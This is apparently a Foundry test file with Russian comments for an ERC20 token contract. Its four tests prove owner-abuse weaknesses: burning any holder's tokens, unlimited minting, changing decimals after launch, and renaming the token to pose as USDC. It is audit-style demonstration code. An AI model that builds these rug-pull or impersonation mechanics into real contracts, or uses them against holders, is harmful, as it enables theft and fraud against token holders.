// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test, console2} from "forge-std/Test.sol";
import {ERC20Token} from "../src/ERC20Token.sol";

/// @dev Тесты-эксплойты к ERC20Token.sol. Каждый тест ДОКАЗЫВАЕТ отдельную
///      уязвимость — если тест проходит (pass), значит атака реально возможна.
contract ERC20TokenHack is Test {
    ERC20Token token;

    address owner = address(this);          // деплоер = владелец контракта
    address alice = address(0xA11CE);       // обычный честный пользователь
    address bob = address(0xB0B);           // ещё один пользователь
    address attackerWallet = address(0xBAD); // куда владелец выводит эмиссию

    uint256 constant INIT_SUPPLY = 1_000_000e18;

    function setUp() public {
        // name="Token", symbol="TKN", supply=1_000_000, decimals=18
        token = new ERC20Token("Token", "TKN", INIT_SUPPLY, 18);

        // Раздаём честным пользователям немного токенов, как в реальной жизни.
        token.transfer(alice, 10_000e18);
        token.transfer(bob, 5_000e18);
    }

    // ─────────────────────────────────────────────────────────────────────────
    // УЯЗВИМОСТЬ #1 (CRITICAL): burn() сжигает токены с ЛЮБОГО адреса.
    // Владелец уничтожает средства Alice без её согласия и без allowance.
    // ─────────────────────────────────────────────────────────────────────────
    function test_Exploit_OwnerBurnsAnyUserBalance() public {
        assertEq(token.balanceOf(alice), 10_000e18, unicode"Alice начинает с 10k TKN");

        // Владелец сжигает ВЕСЬ баланс Alice. Alice ничего не подписывала.
        vm.prank(owner);
        token.burn(alice, 10_000e18);

        assertEq(token.balanceOf(alice), 0, unicode"ЭКСПЛОЙТ: баланс Alice обнулён владельцем");
        console2.log("Alice balance after owner burn:", token.balanceOf(alice));
    }

    // ─────────────────────────────────────────────────────────────────────────
    // УЯЗВИМОСТЬ #2 (HIGH): mint() без лимита — бесконтрольная эмиссия.
    // Владелец печатает себе токенов больше, чем весь исходный supply,
    // размывая доли всех держателей.
    // ─────────────────────────────────────────────────────────────────────────
    function test_Exploit_UnlimitedMintDilution() public {
        uint256 supplyBefore = token.totalSupply();

        // Печатаем на кошелёк атакующего в 1000 раз больше всего supply.
        uint256 minted = supplyBefore * 1000;
        vm.prank(owner);
        token.mint(attackerWallet, minted);

        assertEq(token.balanceOf(attackerWallet), minted, unicode"ЭКСПЛОЙТ: напечатали из воздуха");
        assertGt(token.totalSupply(), supplyBefore, unicode"totalSupply вырос без ограничений");

        // Доля Alice в общем supply рухнула — её токены обесценены.
        console2.log("supply before mint:", supplyBefore);
        console2.log("supply after  mint:", token.totalSupply());
        console2.log("attacker minted   :", minted);
    }

    // ─────────────────────────────────────────────────────────────────────────
    // УЯЗВИМОСТЬ #3 (MEDIUM): decimals можно поменять ПОСЛЕ выпуска токенов.
    // Логическая ошибка: конструктор ставит _isDecimalsSet=false, поэтому
    // владелец может изменить decimals один раз уже после деплоя и торгов.
    // Реальные balances не меняются, но их "видимая" интерпретация — да.
    // ─────────────────────────────────────────────────────────────────────────
    function test_Exploit_MutableDecimalsAfterDeploy() public {
        assertEq(token.decimals(), 18, unicode"стартовые decimals = 18");
        uint256 aliceRaw = token.balanceOf(alice); // сырой баланс не изменится

        // Владелец меняет decimals с 18 на 6 уже после раздачи токенов.
        vm.prank(owner);
        token.setDecimals(6);

        assertEq(token.decimals(), 6, unicode"ЭКСПЛОЙТ: decimals изменены после запуска");
        assertEq(token.balanceOf(alice), aliceRaw, unicode"сырой баланс тот же...");

        // ...но кошельки/биржи показывают balance / 10**decimals.
        // Было: 10000e18 / 1e18 = 10000 TKN.
        // Стало: 10000e18 / 1e6  = 10_000_000_000_000 TKN — видимая сумма взлетела.
        console2.log("visible before (dec=18):", aliceRaw / 1e18);
        console2.log("visible after  (dec=6) :", aliceRaw / 1e6);
    }

    // ─────────────────────────────────────────────────────────────────────────
    // УЯЗВИМОСТЬ #4 (MEDIUM): name/symbol меняются в любой момент и без лимита.
    // Владелец переименовывает токен, выдавая его за известный (фишинг).
    // ─────────────────────────────────────────────────────────────────────────
    function test_Exploit_ImpersonateAnotherTokenViaSetSymbol() public {
        assertEq(token.symbol(), "TKN");
        assertEq(token.name(), "Token");

        // Выдаём свой скам-токен за USDC.
        vm.startPrank(owner);
        token.setName("USD Coin");
        token.setSymbol("USDC");
        vm.stopPrank();

        assertEq(token.symbol(), "USDC", unicode"ЭКСПЛОЙТ: символ подменён на USDC");
        assertEq(token.name(), "USD Coin", unicode"ЭКСПЛОЙТ: имя подменено");
        console2.log("token now pretends to be:", token.name(), token.symbol());
    }
}
